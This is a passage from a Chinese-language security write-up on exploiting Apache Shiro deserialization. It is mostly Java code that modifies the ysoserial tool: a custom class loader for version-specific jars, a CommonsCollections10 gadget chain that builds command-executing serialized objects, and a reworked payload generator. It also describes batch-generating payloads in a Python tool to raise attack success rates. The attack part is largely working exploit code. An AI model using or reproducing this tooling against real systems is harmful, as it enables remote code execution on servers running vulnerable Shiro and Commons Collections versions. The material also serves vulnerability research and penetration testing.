                for(File jar : jarspath){
                    URL url = jar.toURI().toURL();
                    urlClassLoader = new URLClassLoader(new URL[]{url});
                }
            }catch(Exception e){
                System.out.println("加载jar出错！"+e);
            }
            return urlClassLoader;
        }
        public File[] getJarsPath(String gadgetName){
            String basePath = System.getProperty("user.dir")+ File.separator+"lib"+File.separator;
            String directoryPath = basePath + gadgetName;
            File directory = new File(directoryPath);
            File[] jars = directory.listFiles();
            return jars;
        }
        public static void main(String[] args) throws Exception {
            String gadgetName = "hibernate5";
            UrlClassLoaderUtils u = new UrlClassLoaderUtils();
            Class a = u.loadJar(gadgetName).loadClass("org.hibernate.tuple.component.AbstractComponentTuplizer");
        }
    }
2）修改工具链，使用自定义的UrlClassLoaderUtils工具类加载外部依赖的方式实现，这里以工具链CommonsCollections10为例。
    package ysoserial.payloads;
    import ysoserial.Deserializer;
    import ysoserial.Serializer;
    import ysoserial.payloads.util.Gadgets;
    import ysoserial.payloads.util.PayloadRunner;
    import ysoserial.payloads.util.Reflections;
    import ysoserial.UrlClassLoaderUtils;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.net.URLClassLoader;
    import java.util.HashMap;
    import java.util.HashSet;
    import java.util.Map;
    public class CommonsCollections10_ClassLoader_plus extends PayloadRunner implements ObjectPayload {
        private Class InvokerTransformer = null;
        private Class LazyMap = null;
        private Class TiedMapEntry = null;
        private Class Transformer = null;
        public CommonsCollections10_ClassLoader_plus(URLClassLoader urlClassLoader) throws Exception{
            this.Transformer = urlClassLoader.loadClass("org.apache.commons.collections.Transformer");
            this.InvokerTransformer = urlClassLoader.loadClass("org.apache.commons.collections.functors.InvokerTransformer");
            this.LazyMap = urlClassLoader.loadClass("org.apache.commons.collections.map.LazyMap");
            this.TiedMapEntry = urlClassLoader.loadClass("org.apache.commons.collections.keyvalue.TiedMapEntry");
        }
        public HashSet getObject(String command) throws Exception
        {
            Object templates = Gadgets.createTemplatesImpl(command);
            Constructor constructorinvokertransformer = this.InvokerTransformer.getDeclaredConstructor(String.class,Class[].class,Object[].class);
            constructorinvokertransformer.setAccessible(true);
            Object transformer = constructorinvokertransformer.newInstance("toString",new Class[0], new Object[0]);
            Map innerMap = new HashMap();
            Constructor constructorlazymap = this.LazyMap.getDeclaredConstructor(Map.class,this.Transformer);
            HashMap innermap = new HashMap();
            constructorlazymap.setAccessible(true);
            Object lazyMap =  constructorlazymap.newInstance(innermap,transformer);
            Constructor constructortidemapentry = this.TiedMapEntry.getConstructor(Map.class,Object.class);
            constructortidemapentry.setAccessible(true);
            Object entry = constructortidemapentry.newInstance(lazyMap,templates);
            HashSet map = new HashSet(1);
            map.add("foo");
            Field f = null;
            try
            {
                f = HashSet.class.getDeclaredField("map");
            }
            catch (NoSuchFieldException e)
            {
                f = HashSet.class.getDeclaredField("backingMap");
            }
            Reflections.setAccessible(f);
            HashMap innimpl = null;
            innimpl = (HashMap)f.get(map);
            Field f2 = null;
            try
            {
                f2 = HashMap.class.getDeclaredField("table");
            }
            catch (NoSuchFieldException e)
            {
                f2 = HashMap.class.getDeclaredField("elementData");
            }
            Reflections.setAccessible(f2);
            Object[] array = new Object[0];
            array = (Object[])f2.get(innimpl);
            Object node = array[0];
            if (node == null) {
                node = array[1];
            }
            Field keyField = null;
            try
            {
                keyField = node.getClass().getDeclaredField("key");
            }
            catch (Exception e)
            {
                keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
            }
            Reflections.setAccessible(keyField);
            keyField.set(node, entry);
            Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
            return map;
        }
        public static void main(String[] args) throws Exception
        {
            PayloadRunner.run(CommonsCollections10_ClassLoader_plus.class, args);
        }
    }
3）下载多版本依赖到本地
我编写的UrlClassLoaderUtils工具类中，是指定遍历加载项目根目录下lib中的依赖，接下来需要手动下载工具链相关依赖到本地lib目录下，并按版本分别归类文件夹。
4）修改ysoserial启动类GeneratePayload，实例化UrlClassLoaderUtils工具类，开放指定要加载的依赖版本的参数。
    package ysoserial;
    import java.io.PrintStream;
    import java.lang.reflect.Constructor;
    import java.net.URLClassLoader;
    import java.util.*;
    import ysoserial.payloads.ObjectPayload;
    import ysoserial.payloads.ObjectPayload.Utils;
    import ysoserial.payloads.annotation.Authors;
    import ysoserial.payloads.annotation.Dependencies;
    import ysoserial.UrlClassLoaderUtils;
    @SuppressWarnings("rawtypes")
    public class GeneratePayload {
        private static final int INTERNAL_ERROR_CODE = 70;
        private static final int USAGE_CODE = 64;
        public static void main(final String[] args) {
            if (args.length != 3) {
                printUsage();
                System.exit(USAGE_CODE);
            }
            final String payloadType = args[0];
            final String command = args[1];
            final String version = args[2];
            final Class payloadClass = Utils.getPayloadClass(payloadType);
            System.out.println(payloadClass);
            if (payloadClass == null) {
                System.err.println("Invalid payload type '" + payloadType + "'");
                printUsage();
                System.exit(USAGE_CODE);
                return; // make null analysis happy
            }
            try {
                UrlClassLoaderUtils classLoaderUtils = new UrlClassLoaderUtils();
                Constructor> classConstructor = (Constructor>) payloadClass.getDeclaredConstructor(URLClassLoader.class);
                ObjectPayload payload = classConstructor.newInstance(classLoaderUtils.loadJar(version));
                final Object object = payload.getObject(command);
                PrintStream out = System.out;
                Serializer.serialize(object, out);
                ObjectPayload.Utils.releasePayload(payload, object);
            } catch (Throwable e) {
                System.err.println("Error while generating or serializing payload");
                e.printStackTrace();
                System.exit(INTERNAL_ERROR_CODE);
            }
            System.exit(0);
        }
        private static void printUsage() {
            System.err.println("Y SO SERIAL?");
            System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'");
            System.err.println("  Available payload types:");
            final List> payloadClasses =
                new ArrayList>(ObjectPayload.Utils.getPayloadClasses());
            Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize
            final List rows = new LinkedList();
            rows.add(new String[] {"Payload", "Authors", "Dependencies"});
            rows.add(new String[] {"-------", "-------", "------------"});
            for (Class payloadClass : payloadClasses) {
                 rows.add(new String[] {
                    payloadClass.getSimpleName(),
                    Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                    Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)),", ", "", "")
                });
            }
            final List lines = Strings.formatTable(rows);
            for (String line : lines) {
                System.err.println("     " + line);
            }
        }
    }
5) 打包ysoserial为工具jar，与lib目录同级，这里指定加载commons-collections-3.2.jar依赖并生成payload。
6）ysoserial修改好了，接下来将其集成至Python工具中，将lib依赖包和ysoserial-0.0.6-SNAPSHOT-all.jar搬进去，代码中添加执行ysoserial-0.0.6-SNAPSHOT-all.jar批量生成基于多个版本依赖的序列化数据脚本，此时执行脚本即可自动生成多个版本的序列化数据，节省部分人力。
若不需要集成ysoserial-0.0.6-SNAPSHOT-all.jar至工具中，仅仅为了生成序列化数据，可以借鉴[Generate all
unserialize payload via
serialVersionUID](http://www.yulegeyu.com/2019/04/01/Generate-all-unserialize-payload-via-serialVersionUID/)文章中的Generate
payload脚本，通过修改classpath来实现加载不同版本的jar包，看起来效果还不错。（文章地址：http://www.yulegeyu.com/2019/04/01/Generate-all-unserialize-payload-via-serialVersionUID/）
# 0x05 **总结**
本文对Shiro反序列化漏洞进行简单分析，主要集中在漏洞利用部分，以编写利用工具为主线，提出问题寻找解决方案，以及遇到的一些限制和提升攻击成功率的措施，后期尝试优化基于多个版本生成序列化数据的过程，修改ysoserial源码，自定义类加载器动态加载外部jar，坑比较多，但确实可行，如果大家有更好的解决方案，欢迎一起交流学习。
# 0x06 **参考文献**
* * *